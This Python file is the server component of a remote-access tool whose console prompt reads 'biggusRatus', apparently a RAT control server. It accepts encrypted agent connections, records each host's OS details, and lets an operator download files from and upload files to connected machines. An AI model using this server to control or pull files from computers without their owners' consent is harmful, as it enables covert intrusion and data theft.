# Core server implementation.

import base64
import json
import logging
import os
import queue
import socket
import threading
import uuid
from typing import Any, Dict, Optional, Tuple

from common.constants import (
    DEFAULT_HOST,
    DEFAULT_PORT,
    DOWNLOAD_ACTION,
    HANDSHAKE_ACTION,
    MAX_FILE_SIZE_BYTES,
    PROTOCOL_VERSION,
    READ_TIMEOUT_SEC,
    SOCKET_TIMEOUT_SEC,
    TEST_ACTION,
    UPLOAD_ACTION,
)
from common.protocol import (
    build_command,
    build_handshake_response,
    build_success_response,
    decode_message,
    encode_message,
    extract_os_info_from_handshake,
    extract_dh_public_key_from_handshake_command,
)
from common.tcp import ProtocolError, recv_frame, send_frame
from common.crypto import Encryptor, CryptoError
from common.key_exchange import ECDHExchange, KeyExchangeError
from server.output import OutputFormatter
from server.session import AgentSession
from server.path_security import validate_local_path, PathSecurityError

logger = logging.getLogger(__name__)


class Server:
    # Main server class handling agent connections and commands.

    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
        self.host = host
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.running = False
        self.sessions: Dict[str, AgentSession] = {}
        self.lock = threading.Lock()
        self._accept_thread: Optional[threading.Thread] = None
        self.selected_agent_id: Optional[str] = None
        self._response_waiters: Dict[str, "queue.Queue[Dict[str, Any]]"] = {}
        self._response_lock = threading.Lock()

    def start(self) -> None:
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_sock.bind((self.host, self.port))
        listen_sock.listen()
        self.socket = listen_sock
        self.running = True
        self._accept_thread = threading.Thread(
            target=self._accept_connections, name="server-accept", daemon=True
        )
        self._accept_thread.start()
        bound = listen_sock.getsockname()
        logger.info(f"Server started on {bound[0]}:{bound[1]}")

    def _accept_connections(self) -> None:
        assert self.socket is not None
        while self.running:
            try:
                client_socket, address = self.socket.accept()
                agent_id = str(uuid.uuid4())
                logger.info(
                    f"New TCP connection from {address[0]}:{address[1]} "
                    f"(agent_id={agent_id})"
                )
                client_socket.settimeout(SOCKET_TIMEOUT_SEC)
                session = AgentSession(agent_id, address)
                session.socket = client_socket
                with self.lock:
                    self.sessions[agent_id] = session
                thread = threading.Thread(
                    target=self._handle_agent,
                    args=(client_socket, address, agent_id),
                    name=f"agent-{agent_id[:8]}",
                    daemon=True,
                )
                thread.start()
            except OSError:
                break

    def _handle_agent(
        self,
        client_socket: socket.socket,
        address: Tuple[str, int],
        agent_id: str,
    ) -> None:
        try:
            encryptor, os_info = self._perform_handshake(client_socket)
            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.encryptor = encryptor
                    if os_info:
                        session.set_os_info(os_info)
                    session.update_last_seen()
            os_type = os_info.get("os_type", "unknown") if os_info else "unknown"
            logger.info(
                f"Handshake complete for agent {agent_id} "
                f"({address[0]}:{address[1]}) - OS: {os_type}"
            )
            self._agent_message_loop(client_socket, agent_id)
        except socket.timeout as exc:
            logger.warning(
                f"Agent {agent_id} ({address[0]}:{address[1]}) timed out: {exc}"
            )
        except (
            ConnectionError,
            OSError,
            ProtocolError,
            ValueError,
            json.JSONDecodeError,
            CryptoError,
            KeyExchangeError,
        ) as exc:
            logger.warning(
                f"Agent {agent_id} ({address[0]}:{address[1]}) disconnected: {exc}"
            )
        except Exception:
            logger.exception(
                f"Unexpected error handling agent {agent_id} "
                f"({address[0]}:{address[1]})"
            )
        finally:
            try:
                client_socket.close()
            except OSError:
                pass
            with self.lock:
                self.sessions.pop(agent_id, None)
                if self.selected_agent_id == agent_id:
                    self.selected_agent_id = None
            logger.info(f"Agent session closed: {agent_id}")

    def _perform_handshake(
        self, client_socket: socket.socket
    ) -> Tuple[Encryptor, Optional[Dict[str, Any]]]:
        raw = recv_frame(client_socket)
        message = decode_message(raw)
        self._validate_handshake_request(message)
        request_id = str(message.get("id", ""))
        os_info = extract_os_info_from_handshake(message)

        # Extract client's DH public key
        client_dh_public = extract_dh_public_key_from_handshake_command(message)

        if client_dh_public:
            # Perform ECDH key exchange
            ecdh_exchange = ECDHExchange()
            server_dh_public = ecdh_exchange.generate_keypair()
            shared_secret = ecdh_exchange.compute_shared_key(client_dh_public)
            encryptor = Encryptor.from_shared_secret(shared_secret)
            logger.debug("Secure ECDH key exchange completed")
        else:
            # Fallback: generate random key (client won't be able to communicate)
            # This maintains protocol compatibility but rejects unencrypted handshakes
            raise ValueError("Client must support ECDH key exchange")

        response = build_handshake_response(request_id, dh_public_key=server_dh_public)
        send_frame(client_socket, encode_message(response))
        return encryptor, os_info

    @staticmethod
    def _validate_handshake_request(message: Dict[str, Any]) -> None:
        if message.get("version") != PROTOCOL_VERSION:
            raise ValueError("Invalid or unsupported protocol version")
        if message.get("type") != "command":
            raise ValueError("Handshake must be a command message")
        if message.get("action") != HANDSHAKE_ACTION:
            raise ValueError("First message must be handshake command")

    def _handle_agent_incoming(
        self, client_socket: socket.socket, agent_id: str, message: Dict[str, Any]
    ) -> None:
        with self.lock:
            session = self.sessions.get(agent_id)
            encryptor = session.encryptor if session else None
        if message.get("type") == "response":
            rid = str(message.get("id", ""))
            with self._response_lock:
                waiter = self._response_waiters.pop(rid, None)
            if waiter is not None:
                waiter.put(message)
                return
            logger.info(f"Received response from agent {agent_id}: {message}")
            return
        if message.get("type") == "command" and message.get("action") == TEST_ACTION:
            logger.info(f"Received command from agent {agent_id}: {message}")
            req_id = str(message.get("id", ""))
            reply = build_success_response(
                req_id, TEST_ACTION, payload='{"ok":true}', message="test-ok"
            )
            plaintext = encode_message(reply)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(client_socket, ciphertext)
            return
        logger.warning(f"Unhandled message from agent {agent_id}: {message}")

    def _agent_message_loop(self, client_socket: socket.socket, agent_id: str) -> None:
        while self.running:
            try:
                ciphertext = recv_frame(client_socket)
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session and session.encryptor:
                        plaintext = session.decrypt_data(ciphertext)
                    else:
                        plaintext = ciphertext
                message = decode_message(plaintext)
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session:
                        session.update_last_seen()
                self._handle_agent_incoming(client_socket, agent_id, message)
            except socket.timeout:
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session and session.idle_time > READ_TIMEOUT_SEC:
                        logger.warning(
                            f"Agent {agent_id} idle timeout ({session.idle_time:.1f}s)"
                        )
                        raise
                continue
            except CryptoError as exc:
                logger.error(f"Agent {agent_id} decryption error: {exc}")
                raise

    def send_test_to_agent(self, agent_id: str) -> None:
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return
        cmd = build_command(TEST_ACTION, {})
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)
            response = waiter.get(timeout=30.0)
            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()
            logger.info(f"Test round-trip OK from {agent_id}: {response}")
        except queue.Empty:
            logger.error(f"Timed out waiting for test response from {agent_id}")
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def download_from_agent(
        self, agent_id: str, remote_path: str, local_path: str
    ) -> bool:
        # Download a file from an agent and save it locally.
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return False

        # Validate local path to prevent traversal attacks
        try:
            # Resolve to absolute path and ensure parent directory is valid
            safe_local_path = validate_local_path(local_path, allow_absolute=True)
        except PathSecurityError as e:
            logger.error(f"Invalid local path: {e}")
            return False

        cmd = build_command(DOWNLOAD_ACTION, {"remote_path": remote_path})
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)

            response = waiter.get(timeout=120.0)

            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()

            data = response.get("data", {})
            payload = data.get("payload", "{}")
            try:
                result = json.loads(payload)
            except json.JSONDecodeError:
                logger.error("Invalid response payload")
                return False

            if not result.get("success", False):
                logger.error(f"Download failed: {result.get('error', 'Unknown error')}")
                return False

            content_base64 = result.get("content", "")
            if not content_base64:
                logger.error("No file content in response")
                return False

            # Estimate decoded size before decoding to prevent memory exhaustion
            # base64 encoding increases size by ~33%, so decoded size is ~3/4 of encoded
            estimated_size = len(content_base64) * 3 // 4
            if estimated_size > MAX_FILE_SIZE_BYTES:
                logger.error(
                    f"File too large: {estimated_size} bytes (max: {MAX_FILE_SIZE_BYTES}). "
                    f"Rejecting download from agent {agent_id}"
                )
                return False

            file_content = base64.b64decode(content_base64)
            file_size = len(file_content)

            # Create parent directory if needed
            parent_dir = os.path.dirname(safe_local_path)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)

            with open(safe_local_path, "wb") as f:
                f.write(file_content)

            logger.info(
                f"Downloaded {remote_path} -> {safe_local_path} ({file_size} bytes) "
                f"from {agent_id}"
            )
            return True

        except queue.Empty:
            logger.error(f"Timed out waiting for download response from {agent_id}")
            return False
        except Exception as e:
            logger.error(f"Download error: {e}")
            return False
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def upload_to_agent(
        self, agent_id: str, local_path: str, remote_path: str
    ) -> bool:
        # Upload a file from local system to an agent.
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return False

        # Validate local path to prevent traversal attacks
        try:
            safe_local_path = validate_local_path(
                local_path,
                allow_absolute=True,
                must_exist=True
            )
        except PathSecurityError as e:
            logger.error(f"Invalid local path: {e}")
            return False

        if not os.path.isfile(safe_local_path):
            logger.error(f"Not a file: {safe_local_path}")
            return False

        # Check file size before reading to prevent memory exhaustion
        try:
            file_size = os.path.getsize(safe_local_path)
        except OSError as e:
            logger.error(f"Cannot get file size: {e}")
            return False

        if file_size > MAX_FILE_SIZE_BYTES:
            logger.error(
                f"File too large: {file_size} bytes (max: {MAX_FILE_SIZE_BYTES}). "
                f"Rejecting upload to agent {agent_id}"
            )
            return False

        try:
            with open(safe_local_path, "rb") as f:
                file_content = f.read()
            content_base64 = base64.b64encode(file_content).decode("utf-8")

            logger.info(f"Uploading {safe_local_path} ({file_size} bytes) to agent {agent_id}")

            cmd = build_command(UPLOAD_ACTION, {
                "remote_path": remote_path,
                "content": content_base64
            })
            request_id = str(cmd["id"])
            waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
            with self._response_lock:
                self._response_waiters[request_id] = waiter

            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)

            response = waiter.get(timeout=120.0)

            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()

            data = response.get("data", {})
            payload = data.get("payload", "{}")
            try:
                result = json.loads(payload)
            except json.JSONDecodeError:
                logger.error("Invalid response payload")
                return False

            if not result.get("success", False):
                logger.error(f"Upload failed: {result.get('error', 'Unknown error')}")
                return False

            logger.info(
                f"Uploaded {safe_local_path} -> {remote_path} ({file_size} bytes) "
                f"to {agent_id}"
            )
            return True

        except queue.Empty:
            logger.error(f"Timed out waiting for upload response from {agent_id}")
            return False
        except Exception as e:
            logger.error(f"Upload error: {e}")
            return False
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    @staticmethod
    def _print_help() -> None:
        # Display available server commands.
        print("\nAvailable commands:")
        print("  help                           Display available commands")
        print("  list                           Show all connected agents")
        print("  select <agent_id>              Select agent for interaction")
        print("  test                           Send test command to selected agent")
        print("  download <remote> <local>      Download file from agent")
        print("  upload <local> <remote>        Upload file to agent")
        print("  exit                           Disconnect selected agent")
        print("  quit                           Shutdown server")
        print()

    def _get_prompt(self) -> str:
        # Generate the command prompt with context.
        with self.lock:
            session_count = len(self.sessions)
            selected = self.selected_agent_id
        if selected:
            short_id = selected[:8]
            return f"biggusRatus[{short_id}]> "
        return f"biggusRatus[{session_count}]> "

    def run_interactive(self) -> None:
        OutputFormatter.info("Server ready. Type 'help' for commands.")
        while self.running:
            try:
                prompt = self._get_prompt()
                line = input(prompt).strip()
            except EOFError:
                break
            if not line:
                continue
            parts = line.split(maxsplit=1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""
            if cmd == "help":
                self._print_help()
            elif cmd == "list":
                with self.lock:
                    sessions = list(self.sessions.values())
                    selected = self.selected_agent_id
                print(OutputFormatter.format_session_table(sessions, selected))
            elif cmd == "select":
                if not arg:
                    OutputFormatter.error("Usage: select <agent_id>")
                    continue
                with self.lock:
                    if arg not in self.sessions:
                        OutputFormatter.error(f"Unknown agent: {arg}")
                        continue
                    self.selected_agent_id = arg
                OutputFormatter.success(f"Selected agent {arg[:8]}...")
            elif cmd == "test":
                target = self.selected_agent_id
                if target is None:
                    OutputFormatter.error("Select an agent first: select <agent_id>")
                    continue
                self.send_test_to_agent(target)
            elif cmd == "download":
                target = self.selected_agent_id
                if target is None:
                    OutputFormatter.error("Select an agent first: select <agent_id>")
                    continue
                args = arg.split(maxsplit=1)
                if len(args) < 2:
                    OutputFormatter.error("Usage: download <remote_path> <local_path>")
                    continue
                remote_path, local_path = args[0], args[1]
                OutputFormatter.info(f"Downloading {remote_path} -> {local_path}...")
                success = self.download_from_agent(target, remote_path, local_path)
                if success:
                    OutputFormatter.success(f"Downloaded {remote_path} -> {local_path}")
                else:
                    OutputFormatter.error(f"Failed to download {remote_path}")
            elif cmd == "upload":
                target = self.selected_agent_id
                if target is None:
                    OutputFormatter.error("Select an agent first: select <agent_id>")
                    continue
                args = arg.split(maxsplit=1)
                if len(args) < 2:
                    OutputFormatter.error("Usage: upload <local_path> <remote_path>")
                    continue
                local_path, remote_path = args[0], args[1]
                OutputFormatter.info(f"Uploading {local_path} -> {remote_path}...")
                success = self.upload_to_agent(target, local_path, remote_path)
                if success:
                    OutputFormatter.success(f"Uploaded {local_path} -> {remote_path}")
                else:
                    OutputFormatter.error(f"Failed to upload {local_path}")
            elif cmd == "exit":
                if self.selected_agent_id is None:
                    OutputFormatter.warning("No agent selected.")
                    continue
                with self.lock:
                    session = self.sessions.pop(self.selected_agent_id, None)
                    sock = session.socket if session else None
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass
                OutputFormatter.info(f"Disconnected agent {self.selected_agent_id[:8]}...")
                self.selected_agent_id = None
            elif cmd == "quit":
                OutputFormatter.info("Shutting down server...")
                break
            else:
                OutputFormatter.error(f"Unknown command: {cmd}")
                print("Type 'help' for available commands.")

    def stop(self) -> None:
        self.running = False
        with self.lock:
            for session in list(self.sessions.values()):
                if session.socket:
                    try:
                        session.socket.close()
                    except OSError:
                        pass
            self.sessions.clear()
            self.selected_agent_id = None
        if self.socket:
            try:
                self.socket.close()
            except OSError:
                pass
            self.socket = None
        if self._accept_thread is not None:
            self._accept_thread.join(timeout=2.0)
            self._accept_thread = None
        logger.info("Server stopped")
